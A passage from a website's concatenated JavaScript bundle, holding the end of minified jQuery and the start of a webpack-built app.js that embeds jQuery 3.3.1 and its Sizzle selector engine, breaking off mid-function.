E;h.async&&h.timeout>0&&(u=e.setTimeout(function(){E.abort("timeout")},h.timeout));try{c=!1,i.send(b,k)}catch(e){if(c)throw e;k(-1,e)}}else k(-1,"No Transport");function k(t,n,r,s){var l,p,d,b,T,C=n;c||(c=!0,u&&e.clearTimeout(u),i=void 0,a=s||"",E.readyState=t>0?4:0,l=t>=200&&t<300||304===t,r&&(b=Xt(h,E,r)),b=Ut(h,b,E,l),l?(h.ifModified&&((T=E.getResponseHeader("Last-Modified"))&&(w.lastModified[o]=T),(T=E.getResponseHeader("etag"))&&(w.etag[o]=T)),204===t||"HEAD"===h.type?C="nocontent":304===t?C="notmodified":(C=b.state,p=b.data,l=!(d=b.error))):(d=C,!t&&C||(C="error",t<0&&(t=0))),E.status=t,E.statusText=(n||C)+"",l?v.resolveWith(g,[p,C,E]):v.rejectWith(g,[E,C,d]),E.statusCode(x),x=void 0,f&&y.trigger(l?"ajaxSuccess":"ajaxError",[E,h,l?p:d]),m.fireWith(g,[E,C]),f&&(y.trigger("ajaxComplete",[E,h]),--w.active||w.event.trigger("ajaxStop")))}return E},getJSON:function(e,t,n){return w.get(e,t,n,"json")},getScript:function(e,t){return w.get(e,void 0,t,"script")}}),w.each(["get","post"],function(e,t){w[t]=function(e,n,r,i){return g(n)&&(i=i||r,r=n,n=void 0),w.ajax(w.extend({url:e,type:t,dataType:i,data:n,success:r},w.isPlainObject(e)&&e))}}),w._evalUrl=function(e){return w.ajax({url:e,type:"GET",dataType:"script",cache:!0,async:!1,global:!1,"throws":!0})},w.fn.extend({wrapAll:function(e){var t;return this[0]&&(g(e)&&(e=e.call(this[0])),t=w(e,this[0].ownerDocument).eq(0).clone(!0),this[0].parentNode&&t.insertBefore(this[0]),t.map(function(){var e=this;while(e.firstElementChild)e=e.firstElementChild;return e}).append(this)),this},wrapInner:function(e){return g(e)?this.each(function(t){w(this).wrapInner(e.call(this,t))}):this.each(function(){var t=w(this),n=t.contents();n.length?n.wrapAll(e):t.append(e)})},wrap:function(e){var t=g(e);return this.each(function(n){w(this).wrapAll(t?e.call(this,n):e)})},unwrap:function(e){return this.parent(e).not("body").each(function(){w(this).replaceWith(this.childNodes)}),this}}),w.expr.pseudos.hidden=function(e){return!w.expr.pseudos.visible(e)},w.expr.pseudos.visible=function(e){return!!(e.offsetWidth||e.offsetHeight||e.getClientRects().length)},w.ajaxSettings.xhr=function(){try{return new e.XMLHttpRequest}catch(e){}};var Vt={0:200,1223:204},Gt=w.ajaxSettings.xhr();h.cors=!!Gt&&"withCredentials"in Gt,h.ajax=Gt=!!Gt,w.ajaxTransport(function(t){var n,r;if(h.cors||Gt&&!t.crossDomain)return{send:function(i,o){var a,s=t.xhr();if(s.open(t.type,t.url,t.async,t.username,t.password),t.xhrFields)for(a in t.xhrFields)s[a]=t.xhrFields[a];t.mimeType&&s.overrideMimeType&&s.overrideMimeType(t.mimeType),t.crossDomain||i["X-Requested-With"]||(i["X-Requested-With"]="XMLHttpRequest");for(a in i)s.setRequestHeader(a,i[a]);n=function(e){return function(){n&&(n=r=s.onload=s.onerror=s.onabort=s.ontimeout=s.onreadystatechange=null,"abort"===e?s.abort():"error"===e?"number"!=typeof s.status?o(0,"error"):o(s.status,s.statusText):o(Vt[s.status]||s.status,s.statusText,"text"!==(s.responseType||"text")||"string"!=typeof s.responseText?{binary:s.response}:{text:s.responseText},s.getAllResponseHeaders()))}},s.onload=n(),r=s.onerror=s.ontimeout=n("error"),void 0!==s.onabort?s.onabort=r:s.onreadystatechange=function(){4===s.readyState&&e.setTimeout(function(){n&&r()})},n=n("abort");try{s.send(t.hasContent&&t.data||null)}catch(e){if(n)throw e}},abort:function(){n&&n()}}}),w.ajaxPrefilter(function(e){e.crossDomain&&(e.contents.script=!1)}),w.ajaxSetup({accepts:{script:"text/javascript, application/javascript, application/ecmascript, application/x-ecmascript"},contents:{script:/\b(?:java|ecma)script\b/},converters:{"text script":function(e){return w.globalEval(e),e}}}),w.ajaxPrefilter("script",function(e){void 0===e.cache&&(e.cache=!1),e.crossDomain&&(e.type="GET")}),w.ajaxTransport("script",function(e){if(e.crossDomain){var t,n;return{send:function(i,o){t=w("<script>").prop({charset:e.scriptCharset,src:e.url}).on("load error",n=function(e){t.remove(),n=null,e&&o("error"===e.type?404:200,e.type)}),r.head.appendChild(t[0])},abort:function(){n&&n()}}}});var Yt=[],Qt=/(=)\?(?=&|$)|\?\?/;w.ajaxSetup({jsonp:"callback",jsonpCallback:function(){var e=Yt.pop()||w.expando+"_"+Et++;return this[e]=!0,e}}),w.ajaxPrefilter("json jsonp",function(t,n,r){var i,o,a,s=!1!==t.jsonp&&(Qt.test(t.url)?"url":"string"==typeof t.data&&0===(t.contentType||"").indexOf("application/x-www-form-urlencoded")&&Qt.test(t.data)&&"data");if(s||"jsonp"===t.dataTypes[0])return i=t.jsonpCallback=g(t.jsonpCallback)?t.jsonpCallback():t.jsonpCallback,s?t[s]=t[s].replace(Qt,"$1"+i):!1!==t.jsonp&&(t.url+=(kt.test(t.url)?"&":"?")+t.jsonp+"="+i),t.converters["script json"]=function(){return a||w.error(i+" was not called"),a[0]},t.dataTypes[0]="json",o=e[i],e[i]=function(){a=arguments},r.always(function(){void 0===o?w(e).removeProp(i):e[i]=o,t[i]&&(t.jsonpCallback=n.jsonpCallback,Yt.push(i)),a&&g(o)&&o(a[0]),a=o=void 0}),"script"}),h.createHTMLDocument=function(){var e=r.implementation.createHTMLDocument("").body;return e.innerHTML="<form></form><form></form>",2===e.childNodes.length}(),w.parseHTML=function(e,t,n){if("string"!=typeof e)return[];"boolean"==typeof t&&(n=t,t=!1);var i,o,a;return t||(h.createHTMLDocument?((i=(t=r.implementation.createHTMLDocument("")).createElement("base")).href=r.location.href,t.head.appendChild(i)):t=r),o=A.exec(e),a=!n&&[],o?[t.createElement(o[1])]:(o=xe([e],t,a),a&&a.length&&w(a).remove(),w.merge([],o.childNodes))},w.fn.load=function(e,t,n){var r,i,o,a=this,s=e.indexOf(" ");return s>-1&&(r=vt(e.slice(s)),e=e.slice(0,s)),g(t)?(n=t,t=void 0):t&&"object"==typeof t&&(i="POST"),a.length>0&&w.ajax({url:e,type:i||"GET",dataType:"html",data:t}).done(function(e){o=arguments,a.html(r?w("<div>").append(w.parseHTML(e)).find(r):e)}).always(n&&function(e,t){a.each(function(){n.apply(this,o||[e.responseText,t,e])})}),this},w.each(["ajaxStart","ajaxStop","ajaxComplete","ajaxError","ajaxSuccess","ajaxSend"],function(e,t){w.fn[t]=function(e){return this.on(t,e)}}),w.expr.pseudos.animated=function(e){return w.grep(w.timers,function(t){return e===t.elem}).length},w.offset={setOffset:function(e,t,n){var r,i,o,a,s,u,l,c=w.css(e,"position"),f=w(e),p={};"static"===c&&(e.style.position="relative"),s=f.offset(),o=w.css(e,"top"),u=w.css(e,"left"),(l=("absolute"===c||"fixed"===c)&&(o+u).indexOf("auto")>-1)?(a=(r=f.position()).top,i=r.left):(a=parseFloat(o)||0,i=parseFloat(u)||0),g(t)&&(t=t.call(e,n,w.extend({},s))),null!=t.top&&(p.top=t.top-s.top+a),null!=t.left&&(p.left=t.left-s.left+i),"using"in t?t.using.call(e,p):f.css(p)}},w.fn.extend({offset:function(e){if(arguments.length)return void 0===e?this:this.each(function(t){w.offset.setOffset(this,e,t)});var t,n,r=this[0];if(r)return r.getClientRects().length?(t=r.getBoundingClientRect(),n=r.ownerDocument.defaultView,{top:t.top+n.pageYOffset,left:t.left+n.pageXOffset}):{top:0,left:0}},position:function(){if(this[0]){var e,t,n,r=this[0],i={top:0,left:0};if("fixed"===w.css(r,"position"))t=r.getBoundingClientRect();else{t=this.offset(),n=r.ownerDocument,e=r.offsetParent||n.documentElement;while(e&&(e===n.body||e===n.documentElement)&&"static"===w.css(e,"position"))e=e.parentNode;e&&e!==r&&1===e.nodeType&&((i=w(e).offset()).top+=w.css(e,"borderTopWidth",!0),i.left+=w.css(e,"borderLeftWidth",!0))}return{top:t.top-i.top-w.css(r,"marginTop",!0),left:t.left-i.left-w.css(r,"marginLeft",!0)}}},offsetParent:function(){return this.map(function(){var e=this.offsetParent;while(e&&"static"===w.css(e,"position"))e=e.offsetParent;return e||be})}}),w.each({scrollLeft:"pageXOffset",scrollTop:"pageYOffset"},function(e,t){var n="pageYOffset"===t;w.fn[e]=function(r){return z(this,function(e,r,i){var o;if(y(e)?o=e:9===e.nodeType&&(o=e.defaultView),void 0===i)return o?o[t]:e[r];o?o.scrollTo(n?o.pageXOffset:i,n?i:o.pageYOffset):e[r]=i},e,r,arguments.length)}}),w.each(["top","left"],function(e,t){w.cssHooks[t]=_e(h.pixelPosition,function(e,n){if(n)return n=Fe(e,t),We.test(n)?w(e).position()[t]+"px":n})}),w.each({Height:"height",Width:"width"},function(e,t){w.each({padding:"inner"+e,content:t,"":"outer"+e},function(n,r){w.fn[r]=function(i,o){var a=arguments.length&&(n||"boolean"!=typeof i),s=n||(!0===i||!0===o?"margin":"border");return z(this,function(t,n,i){var o;return y(t)?0===r.indexOf("outer")?t["inner"+e]:t.document.documentElement["client"+e]:9===t.nodeType?(o=t.documentElement,Math.max(t.body["scroll"+e],o["scroll"+e],t.body["offset"+e],o["offset"+e],o["client"+e])):void 0===i?w.css(t,n,s):w.style(t,n,i,s)},t,a?i:void 0,a)}})}),w.each("blur focus focusin focusout resize scroll click dblclick mousedown mouseup mousemove mouseover mouseout mouseenter mouseleave change select submit keydown keypress keyup contextmenu".split(" "),function(e,t){w.fn[t]=function(e,n){return arguments.length>0?this.on(t,null,e,n):this.trigger(t)}}),w.fn.extend({hover:function(e,t){return this.mouseenter(e).mouseleave(t||e)}}),w.fn.extend({bind:function(e,t,n){return this.on(e,null,t,n)},unbind:function(e,t){return this.off(e,null,t)},delegate:function(e,t,n,r){return this.on(t,e,n,r)},undelegate:function(e,t,n){return 1===arguments.length?this.off(e,"**"):this.off(t,e||"**",n)}}),w.proxy=function(e,t){var n,r,i;if("string"==typeof t&&(n=e[t],t=e,e=n),g(e))return r=o.call(arguments,2),i=function(){return e.apply(t||this,r.concat(o.call(arguments)))},i.guid=e.guid=e.guid||w.guid++,i},w.holdReady=function(e){e?w.readyWait++:w.ready(!0)},w.isArray=Array.isArray,w.parseJSON=JSON.parse,w.nodeName=N,w.isFunction=g,w.isWindow=y,w.camelCase=G,w.type=x,w.now=Date.now,w.isNumeric=function(e){var t=w.type(e);return("number"===t||"string"===t)&&!isNaN(e-parseFloat(e))},"function"==typeof define&&define.amd&&define("jquery",[],function(){return w});var Jt=e.jQuery,Kt=e.$;return w.noConflict=function(t){return e.$===w&&(e.$=Kt),t&&e.jQuery===w&&(e.jQuery=Jt),w},t||(e.jQuery=e.$=w),w});

/* End */
;
; /* Start:"a:4:{s:4:"full";s:52:"/local/templates/main/jsdist/app.js?1657281159309314";s:6:"source";s:35:"/local/templates/main/jsdist/app.js";s:3:"min";s:0:"";s:3:"map";s:0:"";}"*/
! function(i) {
    var n = {};

    function o(e) {
        if (n[e]) return n[e].exports;
        var t = n[e] = {
            i: e,
            l: !1,
            exports: {}
        };
        return i[e].call(t.exports, t, t.exports, o), t.l = !0, t.exports
    }
    o.m = i, o.c = n, o.d = function(e, t, i) {
        o.o(e, t) || Object.defineProperty(e, t, {
            enumerable: !0,
            get: i
        })
    }, o.r = function(e) {
        "undefined" != typeof Symbol && Symbol.toStringTag && Object.defineProperty(e, Symbol.toStringTag, {
            value: "Module"
        }), Object.defineProperty(e, "__esModule", {
            value: !0
        })
    }, o.t = function(t, e) {
        if (1 & e && (t = o(t)), 8 & e) return t;
        if (4 & e && "object" == typeof t && t && t.__esModule) return t;
        var i = Object.create(null);
        if (o.r(i), Object.defineProperty(i, "default", {
                enumerable: !0,
                value: t
            }), 2 & e && "string" != typeof t)
            for (var n in t) o.d(i, n, function(e) {
                return t[e]
            }.bind(null, n));
        return i
    }, o.n = function(e) {
        var t = e && e.__esModule ? function() {
            return e.default
        } : function() {
            return e
        };
        return o.d(t, "a", t), t
    }, o.o = function(e, t) {
        return Object.prototype.hasOwnProperty.call(e, t)
    }, o.p = "", o(o.s = 1)
}([function(e, t) {
    e.exports = jQuery
}, function(e, t, i) {
    i(2), i(4), i(5), i(7), i(8), i(9), i(10), e.exports = i(11)
}, function(e, Kt, t) {
    "use strict";
    (function(Gt) {
        var Yt, e, t, Vt = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function(e) {
            return typeof e
        } : function(e) {
            return e && "function" == typeof Symbol && e.constructor === Symbol && e !== Symbol.prototype ? "symbol" : typeof e
        };
        e = "undefined" != typeof window ? window : void 0, t = function(S, e) {
            var t = [],
                T = S.document,
                n = Object.getPrototypeOf,
                a = t.slice,
                v = t.concat,
                l = t.push,
                o = t.indexOf,
                i = {},
                s = i.toString,
                g = i.hasOwnProperty,
                r = g.toString,
                d = r.call(Object),
                m = {},
                y = function(e) {
                    return "function" == typeof e && "number" != typeof e.nodeType
                },
                b = function(e) {
                    return null != e && e === e.window
                },
                c = {
                    type: !0,
                    src: !0,
                    noModule: !0
                };

            function w(e, t, i) {
                var n, o = (t = t || T).createElement("script");
                if (o.text = e, i)
                    for (n in c) i[n] && (o[n] = i[n]);
                t.head.appendChild(o).parentNode.removeChild(o)
            }

            function x(e) {
                return null == e ? e + "" : "object" == (void 0 === e ? "undefined" : Vt(e)) || "function" == typeof e ? i[s.call(e)] || "object" : void 0 === e ? "undefined" : Vt(e)
            }
            var C = function e(t, i) {
                    return new e.fn.init(t, i)
                },
                u = /^[\s\uFEFF\xA0]+|[\s\uFEFF\xA0]+$/g;

            function p(e) {
                var t = !!e && "length" in e && e.length,
                    i = x(e);
                return !y(e) && !b(e) && ("array" === i || 0 === t || "number" == typeof t && 0 < t && t - 1 in e)
            }
            C.fn = C.prototype = {
                jquery: "3.3.1",
                constructor: C,
                length: 0,
                toArray: function() {
                    return a.call(this)
                },
                get: function(e) {
                    return null == e ? a.call(this) : e < 0 ? this[e + this.length] : this[e]
                },
                pushStack: function(e) {
                    var t = C.merge(this.constructor(), e);
                    return t.prevObject = this, t
                },
                each: function(e) {
                    return C.each(this, e)
                },
                map: function(i) {
                    return this.pushStack(C.map(this, function(e, t) {
                        return i.call(e, t, e)
                    }))
                },
                slice: function() {
                    return this.pushStack(a.apply(this, arguments))
                },
                first: function() {
                    return this.eq(0)
                },
                last: function() {
                    return this.eq(-1)
                },
                eq: function(e) {
                    var t = this.length,
                        i = +e + (e < 0 ? t : 0);
                    return this.pushStack(0 <= i && i < t ? [this[i]] : [])
                },
                end: function() {
                    return this.prevObject || this.constructor()
                },
                push: l,
                sort: t.sort,
                splice: t.splice
            }, C.extend = C.fn.extend = function() {
                var e, t, i, n, o, s, r = arguments[0] || {},
                    a = 1,
                    l = arguments.length,
                    d = !1;
                for ("boolean" == typeof r && (d = r, r = arguments[a] || {}, a++), "object" == (void 0 === r ? "undefined" : Vt(r)) || y(r) || (r = {}), a === l && (r = this, a--); a < l; a++)
                    if (null != (e = arguments[a]))
                        for (t in e) i = r[t], r !== (n = e[t]) && (d && n && (C.isPlainObject(n) || (o = Array.isArray(n))) ? (s = o ? (o = !1, i && Array.isArray(i) ? i : []) : i && C.isPlainObject(i) ? i : {}, r[t] = C.extend(d, s, n)) : void 0 !== n && (r[t] = n));
                return r
            }, C.extend({
                expando: "jQuery" + ("3.3.1" + Math.random()).replace(/\D/g, ""),
                isReady: !0,
                error: function(e) {
                    throw new Error(e)
                },
                noop: function() {},
                isPlainObject: function(e) {
                    var t, i;
                    return !(!e || "[object Object]" !== s.call(e) || (t = n(e)) && ("function" != typeof(i = g.call(t, "constructor") && t.constructor) || r.call(i) !== d))
                },
                isEmptyObject: function(e) {
                    var t;
                    for (t in e) return !1;
                    return !0
                },
                globalEval: function(e) {
                    w(e)
                },
                each: function(e, t) {
                    var i, n = 0;
                    if (p(e))
                        for (i = e.length; n < i && !1 !== t.call(e[n], n, e[n]); n++);
                    else
                        for (n in e)
                            if (!1 === t.call(e[n], n, e[n])) break; return e
                },
                trim: function(e) {
                    return null == e ? "" : (e + "").replace(u, "")
                },
                makeArray: function(e, t) {
                    var i = t || [];
                    return null != e && (p(Object(e)) ? C.merge(i, "string" == typeof e ? [e] : e) : l.call(i, e)), i
                },
                inArray: function(e, t, i) {
                    return null == t ? -1 : o.call(t, e, i)
                },
                merge: function(e, t) {
                    for (var i = +t.length, n = 0, o = e.length; n < i; n++) e[o++] = t[n];
                    return e.length = o, e
                },
                grep: function(e, t, i) {
                    for (var n = [], o = 0, s = e.length, r = !i; o < s; o++) !t(e[o], o) !== r && n.push(e[o]);
                    return n
                },
                map: function(e, t, i) {
                    var n, o, s = 0,
                        r = [];
                    if (p(e))
                        for (n = e.length; s < n; s++) null != (o = t(e[s], s, i)) && r.push(o);
                    else
                        for (s in e) null != (o = t(e[s], s, i)) && r.push(o);
                    return v.apply([], r)
                },
                guid: 1,
                support: m
            }), "function" == typeof Symbol && (C.fn[Symbol.iterator] = t[Symbol.iterator]), C.each("Boolean Number String Function Array Date RegExp Object Error Symbol".split(" "), function(e, t) {
                i["[object " + t + "]"] = t.toLowerCase()
            });
            var f = function(i) {
                var e, f, w, s, o, h, u, v, x, l, d, k, S, r, T, g, a, c, m, C = "sizzle" + 1 * new Date,
                    y = i.document,
                    $ = 0,
                    n = 0,
                    p = re(),
                    b = re(),
                    A = re(),
                    j = function(e, t) {
                        return e === t && (d = !0), 0
                    },
                    E = {}.hasOwnProperty,
                    t = [],
                    M = t.pop,
                    P = t.push,
                    D = t.push,
                    q = t.slice,
                    H = function(e, t) {
                        for (var i = 0, n = e.length; i < n; i++)
                            if (e[i] === t) return i;
                        return -1
                    },
                    N = "checked|selected|async|autofocus|autoplay|controls|defer|disabled|hidden|ismap|loop|multiple|open|readonly|required|scoped",
                    O = "[\\x20\\t\\r\\n\\f]",
                    L = "(?:\\\\.|[\\w-]|[^\0-\\xa0])+",
                    _ = "\\[" + O + "*(" + L + ")(?:" + O + "*([*^$|!~]?=)" + O + "*(?:'((?:\\\\.|[^\\\\'])*)'|\"((?:\\\\.|[^\\\\\"])*)\"|(" + L + "))|)" + O + "*\\]",
                    I = ":(" + L + ")(?:\\((('((?:\\\\.|[^\\\\'])*)'|\"((?:\\\\.|[^\\\\\"])*)\")|((?:\\\\.|[^\\\\()[\\]]|" + _ + ")*)|.*)\\)|)",
                    W = new RegExp(O + "+", "g"),
                    z = new RegExp("^" + O + "+|((?:^|[^\\\\])(?:\\\\.)*)" + O + "+$", "g"),
                    R = new RegExp("^" + O + "*," + O + "*"),
                    F = new RegExp("^" + O + "*([>+~]|" + O + ")" + O + "*"),
                    B = new RegExp("=" + O + "*([^\\]'\"]*?)" + O + "*\\]", "g"),
                    X = new RegExp(I),
                    U = new RegExp("^" + L + "$"),
                    G = {
                        ID: new RegExp("^#(" + L + ")"),
                        CLASS: new RegExp("^\\.(" + L + ")"),
                        TAG: new RegExp("^(" + L + "|[*])"),
                        ATTR: new RegExp("^" + _),
                        PSEUDO: new RegExp("^" + I),
                        CHILD: new RegExp("^:(only|first|last|nth|nth-last)-(child|of-type)(?:\\(" + O + "*(even|odd|(([+-]|)(\\d*)n|)" + O + "*(?:([+-]|)" + O + "*(\\d+)|))" + O + "*\\)|)", "i"),
                        bool: new RegExp("^(?:" + N + ")$", "i"),
                        needsContext: new RegExp("^" + O + "*[>+~]|:(even|odd|eq|gt|lt|nth|first|last)(?:\\(" + O + "*((?:-\\d)?\\d*)" + O + "*\\)|)(?=[^-]|$)", "i")
                    },
                    Y = /^(?:input|select|textarea|button)$/i,
                    V = /^h\d$/i,
                    K = /^[^{]+\{\s*\[native \w/,
                    Q = /^(?:#([\w-]+)|(\w+)|\.([\w-]+))$/,
                    J = /[+~]/,
                    Z = new RegExp("\\\\([\\da-f]{1,6}" + O + "?|(" + O + ")|.)", "ig"),
                    ee = function(e, t, i) {
                        var n = "0x" + t - 65536;
                        return n != n || i ? t : n < 0 ? String.fromCharCode(n + 65536) : String.fromCharCode(n >> 10 | 55296, 1023 & n | 56320)
                    },
                    te = /([\0-\x1f\x7f]|^-?\d)|^-$|[^\0-\x1f\x7f-\uFFFF\w-]/g,
                    ie = function(e, t) {
                        return t ? "\0" === e ? "�" : e.slice(0, -1) + "\\" + e.charCodeAt(e.length - 1).toString(16) + " " : "\\" + e
                    },
                    ne = function() {
                        k()
                    },
                    oe = ye(function(e) {
                        return !0 === e.disabled && ("form" in e || "label" in e)
                    }, {
                        dir: "parentNode",
                        next: "legend"
                    });
                try {
                    D.apply(t = q.call(y.childNodes), y.childNodes), t[y.childNodes.length].nodeType
                } catch (i) {
                    D = {
                        apply: t.length ? function(e, t) {
                            P.apply(e, q.call(t))
                        } : function(e, t) {
                            for (var i = e.length, n = 0; e[i++] = t[n++];);
                            e.length = i - 1
                        }
                    }
                }

                function se(e, t, i, n) {
                    var o, s, r, a, l, d, c, u = t && t.ownerDocument,
                        p = t ? t.nodeType : 9;
                    if (i = i || [], "string" != typeof e || !e || 1 !== p && 9 !== p && 11 !== p) return i;
                    if (!n && ((t ? t.ownerDocument || t : y) !== S && k(t), t = t || S, T)) {
                        if (11 !== p && (l = Q.exec(e)))
                            if (o = l[1]) {
                                if (9 === p) {
                                    if (!(r = t.getElementById(o))) return i;
                                    if (r.id === o) return i.push(r), i
                                } else if (u && (r = u.getElementById(o)) && m(t, r) && r.id === o) return i.push(r), i
                            } else {
                                if (l[2]) return D.apply(i, t.getElementsByTagName(e)), i;
                                if ((o = l[3]) && f.getElementsByClassName && t.getElementsByClassName) return D.apply(i, t.getElementsByClassName(o)), i
                            }
                        if (f.qsa && !A[e + " "] && (!g || !g.test(e))) {
                            if (1 !== p) u = t, c = e;
                            else if ("object" !== t.nodeName.toLowerCase()) {
                                for ((a = t.getAttribute("id")) ? a = a.replace(te, ie) : t.setAttribute("id", a = C), s = (d = h(e)).length; s--;) d[s] = "#" + a + " " + me(d[s]);
                                c = d.join(","), u = J.test(e) && ve(t.parentNode) || t
                            }
                            if (c) try {
                                return D.apply(i, u.querySelectorAll(c)), i
                            } catch (e) {} finally {
                                a === C && t.removeAttribute("id")
                            }
                        }
                    }
                    return v(e.replace(z, "$1"), t, i, n)
                }

                function re() {
                    var n = [];
                    return function e(t, i) {
                        return n.push(t + " ") > w.cacheLength && delete e[n.shift()], e[t + " "] = i
                    }
                }

                function ae(e) {
                    return e[C] = !0, e
                }

                function le(e) {
                    var t = S.createElement("fieldset");
                    try {
                        return !!e(t)
                    } catch (e) {
                        return !1
                    } finally {
                        t.parentNode && t.parentNode.removeChild(t), t = null
                    }
                }

                function de(e, t) {
                    for (var i = e.split("|"), n = i.length; n--;) w.attrHandle[i[n]] = t
                }

                function ce(e, t) {
                    var i = t && e,
                        n = i && 1 === e.nodeType && 1 === t.nodeType && e.sourceIndex - t.sourceIndex;
                    if (n) return n;
                    if (i)
                        for (; i = i.nextSibling;)
                            if (i === t) return -1;
                    return e ? 1 : -1
                }

                function ue(t) {
                    return function(e) {
                        return "input" === e.nodeName.toLowerCase() && e.type === t
                    }
                }

                function pe(i) {
                    return function(e) {
                        var t = e.nodeName.toLowerCase();
                        return ("input" === t || "button" === t) && e.type === i
                    }
                }

                function fe(t) {
                    return function(e) {
                        return "form" in e ? e.parentNode && !1 === e.disabled ? "label" in e ? "label" in e.parentNode ? e.parentNode.disabled === t : e.disabled === t : e.isDisabled === t || e.isDisabled !== !t && oe(e) === t : e.disabled === t : "label" in e && e.disabled === t
                    }
                }

                function he(r) {
                    return ae(function(s) {
                        return s = +s, ae(function(e, t) {
                            for (var i, n = r([], e.length, s), o = n.length; o--;) e[i = n[o]] && (e[i] = !(t[i] = e[i]))
                        })
                    })
                }

                function ve(e) {
                    return e && void 0 !== e.getElementsByTagName && e
                }
                for (e in f = se.support = {}, o = se.isXML = function(e) {
                        var t = e && (e.ownerDocument || e).documentElement;
                        return !!t && "HTML" !== t.nodeName
                    }, k = se.setDocument = function(e) {
                        var t, i, n = e ? e.ownerDocument || e : y;
                        return n !== S && 9 === n.nodeType && n.documentElement && (r = (S = n).documentElement, T = !o(S), y !== S && (i = S.defaultView) && i.top !== i && (i.addEventListener ? i.addEventListener("unload", ne, !1) : i.attachEvent && i.attachEvent("onunload", ne)), f.attributes = le(function(e) {
                            return e.className = "i", !e.getAttribute("className")
                        }), f.getElementsByTagName = le(function(e) {
                            return e.appendChild(S.createComment("")), !e.getElementsByTagName("*").length
                        }), f.getElementsByClassName = K.test(S.getElementsByClassName), f.getById = le(function(e) {
                            return r.appendChild(e).id = C, !S.getElementsByName || !S.getElementsByName(C).length
                        }), f.getById ? (w.filter.ID = function(e) {
                            var t = e.replace(Z, ee);
                            return function(e) {
                                return e.getAttribute("id") === t
                            }
                        }, w.find.ID = function(e, t) {
                            if (void 0 !== t.getElementById && T) {
                                var i = t.getElementById(e);
                                return i ? [i] : []
                            }
                        }) : (w.filter.ID = function(e) {
                            var i = e.replace(Z, ee);
                            return function(e) {
                                var t = void 0 !== e.getAttributeNode && e.getAttributeNode("id");
                                return t && t.value === i
                            }
                        }, w.find.ID = function(e, t) {
                            if (void 0 !== t.getElementById && T) {
                                var i, n, o, s = t.getElementById(e);
                                if (s) {
                                    if ((i = s.getAttributeNode("id")) && i.value === e) return [s];
                                    for (o = t.getElementsByName(e), n = 0; s = o[n++];)
                                        if ((i = s.getAttributeNode("id")) && i.value === e) return [s]
                                }
                                return []
                            }
                        }), w.find.TAG = f.getElementsByTagName ? function(e, t) {
                            return void 0 !== t.getElementsByTagName ? t.getElementsByTagName(e) : f.qsa ? t.querySelectorAll(e) : void 0
                        } : function(e, t) {
                            var i, n = [],
                                o = 0,
                                s = t.getElementsByTagName(e);
                            if ("*" !== e) return s;
                            for (; i = s[o++];) 1 === i.nodeType && n.push(i);
                            return n
                        }, w.find.CLASS = f.getElementsByClassName && function(e, t) {
                            if (void 0 !== t.getElementsByClassName && T) return t.getElementsByClassName(e)
                        }, a = [], g = [], (f.qsa = K.test(S.querySelectorAll)) && (le(function(e) {
                            r.appendChild(e).innerHTML = "<a id='" + C + "'></a><select id='" + C + "-\r\\' msallowcapture=''><option selected=''></option></select>", e.querySelectorAll("[msallowcapture^='']").length && g.push("[*^$]=" + O + "*(?:''|\"\")"), e.querySelectorAll("[selected]").length || g.push("\\[" + O + "*(?:value|" + N + ")"), e.querySelectorAll("[id~=" + C + "-]").length || g.push("~="), e.querySelectorAll(":checked").length || g.push(":checked"), e.querySelectorAll("a#" + C + "+*").length || g.push(".#.+[+~]")
                        }), le(function(e) {
                            e.innerHTML = "<a href='' disabled='disabled'></a><select disabled='disabled'><option/></select>";
                            var t = S.createElement("input");
                            t.setAttribute("type", "hidden"), e.appendChild(t).setAttribute("name", "D"), e.querySelectorAll("[name=d]").length && g.push("name" + O + "*[*^$|!~]?="), 2 !== e.querySelectorAll(":enabled").length && g.push(":enabled", ":disabled"), r.appendChild(e).disabled = !0, 2 !== e.querySelectorAll(":disabled").length && g.push(":enabled", ":disabled"), e.querySelectorAll("*,:x"), g.push(",.*:")
                        })), (f.matchesSelector = K.test(c = r.matches || r.webkitMatchesSelector || r.mozMatchesSelector || r.oMatchesSelector || r.msMatchesSelector)) && le(function(e) {
                            f.disconnectedMatch = c.call(e, "*"), c.call(e, "[s!='']:x"), a.push("!=", I)
                        }), g = g.length && new RegExp(g.join("|")), a = a.length && new RegExp(a.join("|")), t = K.test(r.compareDocumentPosition), m = t || K.test(r.contains) ? function(e, t) {
                            var i = 9 === e.nodeType ? e.documentElement : e,
                                n = t && t.parentNode;
                            return e === n || !(!n || 1 !== n.nodeType || !(i.contains ? i.contains(n) : e.compareDocumentPosition && 16 & e.compareDocumentPosition(n)))
                        } : function(e, t) {
                            if (t)
                                for (; t = t.parentNode;)
                                    if (t === e) return !0;
                            return !1
                        }, j = t ? function(e, t) {
                            if (e === t) return d = !0, 0;
                            var i = !e.compareDocumentPosition - !t.compareDocumentPosition;
                            return i || (1 & (i = (e.ownerDocument || e) === (t.ownerDocument || t) ? e.compareDocumentPosition(t) : 1) || !f.sortDetached && t.compareDocumentPosition(e) === i ? e === S || e.ownerDocument === y && m(y, e) ? -1 : t === S || t.ownerDocument === y && m(y, t) ? 1 : l ? H(l, e) - H(l, t) : 0 : 4 & i ? -1 : 1)
                        } : function(e, t) {
                            if (e === t) return d = !0, 0;
                            var i, n = 0,
                                o = e.parentNode,
                                s = t.parentNode,
                                r = [e],
                                a = [t];
                            if (!o || !s) return e === S ? -1 : t === S ? 1 : o ? -1 : s ? 1 : l ? H(l, e) - H(l, t) : 0;
                            if (o === s) return ce(e, t);
                            for (i = e; i = i.parentNode;) r.unshift(i);
                            for (i = t; i = i.parentNode;) a.unshift(i);
                            for (; r[n] === a[n];) n++;
                            return n ? ce(r[n], a[n]) : r[n] === y ? -1 : a[n] === y ? 1 : 0
                        }), S
                    }, se.matches = function(e, t) {
                        return se(e, null, null, t)
                    }, se.matchesSelector = function(e, t) {
                        if ((e.ownerDocument || e) !== S && k(e), t = t.replace(B, "='$1']"), f.matchesSelector && T && !A[t + " "] && (!a || !a.test(t)) && (!g || !g.test(t))) try {
                            var i = c.call(e, t);
                            if (i || f.disconnectedMatch || e.document && 11 !== e.document.nodeType) return i
                        } catch (e) {}
                        return 0 < se(t, S, null, [e]).length
                    }, se.contains = function(e, t) {
                        return (e.ownerDocument || e) !== S && k(e), m(e, t)
                    }, se.attr = function(e, t) {
                        (e.ownerDocument || e) !== S && k(e);
                        var i = w.attrHandle[t.toLowerCase()],
                            n = i && E.call(w.attrHandle, t.toLowerCase()) ? i(e, t, !T) : void 0;
                        return void 0 !== n ? n : f.attributes || !T ? e.getAttribute(t) : (n = e.getAttributeNode(t)) && n.specified ? n.value : null
